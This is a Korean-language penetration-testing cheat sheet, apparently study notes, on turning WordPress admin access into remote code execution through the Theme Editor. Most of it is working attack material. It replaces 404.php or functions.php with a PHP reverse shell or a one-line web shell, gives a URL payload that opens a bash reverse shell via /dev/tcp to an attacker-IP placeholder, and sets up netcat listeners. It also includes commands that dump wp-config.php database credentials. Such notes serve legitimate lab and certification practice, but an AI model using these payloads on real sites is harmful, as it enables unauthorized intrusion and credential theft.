# 03_테마편집_RCE

# WordPress — 테마 파일 편집 (RCE)

admin 패널 접근 후 가장 빠르게 RCE 달성하는 방법. Appearance → Theme Editor에서 PHP 파일 직접 수정.

---

## 단계별 공격

```
1. wp-admin 로그인
2. Appearance (외관) → Theme Editor (테마 편집기)
3. 오른쪽 파일 목록에서 404.php 선택
   (없으면 functions.php, index.php 등)
4. 내용 전체를 PHP 리버스쉘로 교체
5. Update File 클릭
6. 리스너 실행 후 해당 파일 URL 접속
```

---

## 편집 대상 파일

```bash
# 404.php — 가장 추천 (기능에 영향 적음)
http://<IP>/wp-content/themes/<테마명>/404.php

# functions.php — WordPress 로드 시 자동 실행
http://<IP>/wp-content/themes/<테마명>/functions.php

# 자주 쓰이는 테마명
twentytwentyfour
twentytwentythree
twentytwentytwo
twentytwentyone
twentytwenty
twentynineteen
```

---

## pentestmonkey PHP 리버스쉘

```bash
# 준비
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# $ip = '<칼리IP>';
# $port = 4444;
# 수정 후 내용 전체 복사
```

```php
<?php
// php-reverse-shell 내용 붙여넣기
// $ip = '<칼리IP>';
// $port = 4444;
?>
```

---

## 간단한 웹쉘로 테스트 후 리버스쉘

```php
<?php system($_GET['cmd']); ?>
```

```bash
# 웹쉘로 먼저 확인
http://<IP>/wp-content/themes/twentytwenty/404.php?cmd=id

# 리버스쉘로 업그레이드
http://<IP>/wp-content/themes/twentytwenty/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<칼리IP>/4444+0>%261'
```

---

## 리스너

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444    # 더 편한 인터페이스
```

---

## 쉘 획득 후

```bash
# TTY 업그레이드
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# wp-config.php 확인 (DB 자격증명)
cat /var/www/html/wp-config.php
find / -name "wp-config.php" 2>/dev/null | xargs cat
```

---

## 팁

- 테마 편집기가 비활성화된 경우 → 플러그인 업로드 방법 사용
- PHP 코드가 저장 안 되면 → 파일이 read-only. 플러그인 방법으로 전환
- 관리자가 아닌 편집자(editor) 계정도 테마 편집 가능한 경우 있음